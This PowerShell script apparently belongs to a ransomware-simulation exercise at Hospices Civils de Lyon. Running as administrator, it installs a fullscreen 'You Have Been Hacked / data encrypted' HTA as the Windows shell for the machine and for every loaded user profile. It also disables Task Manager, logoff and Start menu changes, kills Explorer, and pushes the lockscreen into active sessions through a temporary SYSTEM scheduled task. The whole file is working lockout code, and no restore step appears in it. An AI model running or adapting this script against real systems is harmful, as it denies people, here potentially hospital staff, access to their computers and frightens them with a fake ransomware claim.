#==============================================================================
# LOCKOUT_PC.ps1 — Cyber Exercise: Fullscreen "You Have Been Hacked" Lockout
# FIXED: Uses HKLM (machine-wide) + per-user SID hives via HKEY_USERS
#        Works correctly when run as SYSTEM via scheduled task on Windows 10
#==============================================================================

# --- Ensure running as admin ---
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] ERROR: Must run as Administrator." -ForegroundColor Red
    exit 1
}

$HtaPath = "C:\CyberExercise\lockscreen.hta"
$ExerciseDir = "C:\CyberExercise"

if (!(Test-Path $ExerciseDir)) { New-Item -ItemType Directory -Path $ExerciseDir -Force }

# =============================================
# STEP 1: Create the HTA lockscreen file
# =============================================
$htaContent = @'
<html>
<head>
<title>SYSTEM COMPROMISED</title>
<HTA:APPLICATION
  ID="Lockscreen"
  APPLICATIONNAME="Lockscreen"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  CONTEXTMENU="no"
  INNERBORDER="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  NAVIGABLE="no"
  SCROLL="no"
  SELECTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="maximize"
/>
<style>
  * { margin: 0; padding: 0; }
  body {
    background: #0a0a0a;
    color: #ff0000;
    font-family: 'Courier New', monospace;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
    cursor: none;
    user-select: none;
  }
  .skull {
    font-size: 80px;
    margin-bottom: 20px;
    animation: pulse 2s ease-in-out infinite;
  }
  h1 {
    font-size: 72px;
    text-transform: uppercase;
    letter-spacing: 10px;
    text-shadow: 0 0 20px #ff0000, 0 0 40px #cc0000;
    animation: glitch 1.5s infinite;
    margin-bottom: 30px;
  }
  .sub {
    font-size: 28px;
    color: #cc0000;
    letter-spacing: 5px;
    margin-bottom: 10px;
  }
  .info {
    font-size: 18px;
    color: #666;
    margin-top: 40px;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.7; transform: scale(1.05); }
  }
  @keyframes glitch {
    0%, 90%, 100% { transform: translate(0); }
    92% { transform: translate(-5px, 2px); }
    94% { transform: translate(5px, -2px); }
    96% { transform: translate(-3px, -1px); }
    98% { transform: translate(3px, 1px); }
  }
</style>
<script language="VBScript">
  Sub document_onkeydown
    Set ev = window.event
    If ev.altKey And ev.keyCode = 115 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 87 Then ev.returnValue = False
    If ev.ctrlKey And ev.keyCode = 27 Then ev.returnValue = False
    If ev.altKey And ev.keyCode = 9 Then ev.returnValue = False
    If ev.keyCode = 122 Then ev.returnValue = False
    If ev.keyCode = 91 Or ev.keyCode = 92 Then ev.returnValue = False
  End Sub

  Sub window_onload
    window.moveTo 0, 0
    window.resizeTo screen.width, screen.height
    setInterval "self.focus", 500
  End Sub
</script>
</head>
<body ondragstart="return false" onselectstart="return false" oncontextmenu="return false">
  <div class="skull">&#9760;</div>
  <h1>You Have Been Hacked</h1>
  <div class="sub">ALL YOUR SYSTEMS ARE COMPROMISED</div>
  <div class="sub">ALL YOUR DATA HAS BEEN ENCRYPTED</div>
  <div class="info">[ CYBER EXERCISE — HOSPICES CIVILS DE LYON ]</div>
</body>
</html>
'@

Set-Content -Path $HtaPath -Value $htaContent -Encoding UTF8
Write-Host "[+] HTA lockscreen created" -ForegroundColor Yellow

# =============================================
# STEP 2: MACHINE-WIDE registry (HKLM) — affects ALL users
# =============================================

# Backup original shell
$shellReg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$originalShell = (Get-ItemProperty -Path $shellReg -Name "Shell" -ErrorAction SilentlyContinue).Shell
if ($originalShell -and $originalShell -ne "mshta.exe $HtaPath") {
    Set-ItemProperty -Path $shellReg -Name "Shell_Backup" -Value $originalShell -Type String
    Write-Host "[+] Original shell backed up: $originalShell" -ForegroundColor Yellow
}

# Replace shell machine-wide
Set-ItemProperty -Path $shellReg -Name "Shell" -Value "mshta.exe $HtaPath" -Type String
Write-Host "[+] Shell replaced (HKLM)" -ForegroundColor Yellow

# Disable Task Manager machine-wide
$regPolicies = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (!(Test-Path $regPolicies)) { New-Item -Path $regPolicies -Force | Out-Null }
Set-ItemProperty -Path $regPolicies -Name "DisableTaskMgr" -Value 1 -Type DWord
Write-Host "[+] Task Manager disabled (HKLM)" -ForegroundColor Yellow

# Disable logoff/start menu machine-wide
$regExplorer = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (!(Test-Path $regExplorer)) { New-Item -Path $regExplorer -Force | Out-Null }
Set-ItemProperty -Path $regExplorer -Name "NoLogoff" -Value 1 -Type DWord
Set-ItemProperty -Path $regExplorer -Name "NoChangeStartMenu" -Value 1 -Type DWord
Write-Host "[+] Ctrl+Alt+Del options disabled (HKLM)" -ForegroundColor Yellow

# =============================================
# STEP 3: PER-USER registry via HKEY_USERS (catches logged-in sessions)
# =============================================

$loadedProfiles = Get-ChildItem "Registry::HKEY_USERS" | Where-Object {
    $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$'
}

foreach ($profile in $loadedProfiles) {
    $sid = $profile.PSChildName

    # Shell per-user
    $userWinlogon = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    if (!(Test-Path $userWinlogon)) { New-Item -Path $userWinlogon -Force | Out-Null }
    Set-ItemProperty -Path $userWinlogon -Name "Shell" -Value "mshta.exe $HtaPath" -Type String

    # Task Manager per-user
    $userPolicies = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    if (!(Test-Path $userPolicies)) { New-Item -Path $userPolicies -Force | Out-Null }
    Set-ItemProperty -Path $userPolicies -Name "DisableTaskMgr" -Value 1 -Type DWord

    # Explorer policies per-user
    $userExplorer = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    if (!(Test-Path $userExplorer)) { New-Item -Path $userExplorer -Force | Out-Null }
    Set-ItemProperty -Path $userExplorer -Name "NoLogoff" -Value 1 -Type DWord
    Set-ItemProperty -Path $userExplorer -Name "NoChangeStartMenu" -Value 1 -Type DWord

    Write-Host "[+] User $sid locked" -ForegroundColor Yellow
}

# =============================================
# STEP 4: Kill Explorer and launch HTA in user sessions
# =============================================

Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Write-Host "[+] Explorer killed" -ForegroundColor Yellow

# Get active user sessions and launch HTA in each
$queryResult = quser 2>$null
if ($queryResult) {
    $queryResult | Select-Object -Skip 1 | ForEach-Object {
        if ($_ -match '(\d+)\s+(Active|Actif)') {
            $sessionId = $Matches[1]
            # Create a temp task that runs in the interactive session
            $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><TimeTrigger><StartBoundary>1999-01-01T00:00:00</StartBoundary><Enabled>false</Enabled></TimeTrigger></Triggers>
  <Principals><Principal><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries></Settings>
  <Actions><Exec><Command>mshta.exe</Command><Arguments>$HtaPath</Arguments></Exec></Actions>
</Task>
"@
            $tempTaskName = "CyberEx_HTA_$sessionId"
            $xmlPath = "$ExerciseDir\task_$sessionId.xml"
            Set-Content -Path $xmlPath -Value $taskXml -Encoding Unicode
            schtasks /create /tn $tempTaskName /xml $xmlPath /f 2>$null | Out-Null
            schtasks /run /tn $tempTaskName 2>$null | Out-Null
            Start-Sleep -Milliseconds 500
            schtasks /delete /tn $tempTaskName /f 2>$null | Out-Null
            Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
            Write-Host "[+] HTA launched in session $sessionId" -ForegroundColor Yellow
        }
    }
} else {
    # Fallback
    Start-Process "mshta.exe" -ArgumentList $HtaPath
    Write-Host "[+] HTA launched (fallback)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[*] === LOCKOUT COMPLETE ===" -ForegroundColor Red
